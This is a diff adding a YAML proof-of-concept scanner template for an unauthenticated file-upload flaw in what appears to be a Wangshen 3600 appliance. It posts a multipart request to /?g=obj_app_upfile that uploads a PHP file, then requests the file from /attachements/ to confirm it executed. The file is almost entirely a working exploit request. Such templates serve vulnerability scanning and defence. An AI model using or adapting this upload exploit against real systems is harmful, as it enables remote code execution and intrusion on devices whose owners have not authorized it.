@@ -1,0 +1,42 @@
+name: poc-yaml-wangshen-3600-objapp-upload
+detail:
+  author: 
+  links:
+set:
+  s1: randomInt(1000,9999)
+groups:
+  yesha:
+    - method: POST
+      path: /?g=obj_app_upfile 
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+      body: |
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data;name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="upfile"; filename="{{s1}}.php"
+        Content-Type: text/plain
+
+        <?php echo "123"?>
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data;name="submit_post"
+
+        obj_app_upfile
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="__hash__"
+
+        0b9d6b1ab7479ab69d9f71b05e0e9445
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+      expression: >-
+        response.body.bcontains(b'successfully uploaded')
+    - method: GET
+      path: /attachements/{{s1}}.php
+      expression: >-
+        response.body.bcontains(b'123')
+      
+
+        
+    
+      
